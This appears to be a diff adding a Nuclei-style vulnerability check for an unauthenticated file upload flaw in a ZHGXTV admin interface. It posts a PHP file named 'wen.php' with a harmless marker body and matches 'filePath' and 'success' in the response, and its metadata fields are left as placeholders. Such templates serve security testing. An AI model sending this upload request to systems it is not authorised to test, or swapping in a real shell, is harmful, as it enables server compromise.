@@ -1,0 +1,47 @@
+id: ZHGXTV-uploadfile-upload
+info:
+  name: ZHGXTV-uploadfile-upload
+  author: apple
+  severity:  critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /ZHGXTV/index.php/Admin/Common/test HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+
+      - |
+        POST /ZHGXTV/index.php/admin/common/uploadfile.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 204
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxcexPspczP3BiouN
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+
+
+
+        ------WebKitFormBoundaryxcexPspczP3BiouN
+        Content-Disposition: form-data; name="file"; filename="wen.php"
+        Content-Type: application/octet-stream
+
+        <?php 123 ?>
+        ------WebKitFormBoundaryxcexPspczP3BiouN--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'filePath'
+      - type: word
+        part: body
+        words:
+          - 'success'
